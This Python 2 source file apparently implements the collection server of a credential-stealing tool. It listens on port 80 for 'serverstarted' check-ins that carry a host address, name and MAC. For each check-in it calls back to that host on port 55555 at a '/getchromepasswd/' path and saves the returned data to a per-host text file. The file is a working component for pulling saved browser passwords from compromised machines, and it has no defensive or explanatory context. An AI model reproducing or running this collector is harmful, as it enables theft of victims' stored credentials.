__author__ = 'nuaa-wangj'
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import re
import httplib

class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            print(self.path)
            print('\n')
            m = re.search('serverstarted',self.path)
            if m is not None:
                newpath = self.path[self.path.find('/',1):]
                svaddr = newpath[1: newpath.find('/',1)]

                svnameandmac = newpath[newpath.find('/',1):]
                svname = svnameandmac[1: svnameandmac.find('/',1)]

                svmac = svnameandmac[svnameandmac.find('/',1)+1:]
                print(svaddr,svname,svmac)
                self.send_response(200)
                self.end_headers()
                sendrequest(svaddr, svname)
        except IOError:
            self.send_error(404, 'File Not Found: %s' % self.path)

def sendrequest(svaddr, svname):
    httpClient = None
    try:
        requesturl = "/getchromepasswd/"+svaddr+"/"+svname
        print(requesturl)
        httpClient = httplib.HTTPConnection(str(svaddr), 55555)
        httpClient.request('GET', requesturl)
        response = httpClient.getresponse()
        print response.status
        print response.reason
        filename = svaddr+'.txt'
        myfile = file('./'+filename, 'wb')
        myfile.write(response.read())
        myfile.close()
    except Exception, e:
        print e
    finally:
        if httpClient:
            httpClient.close()
    return
class ThreadingHttpServer(ThreadingMixIn, HTTPServer):
    pass

PORT_NUM = 80
serverAddress = ("",PORT_NUM)
server = ThreadingHttpServer(serverAddress, myHandler)
print 'Started httpserver on port ', PORT_NUM
server.serve_forever()
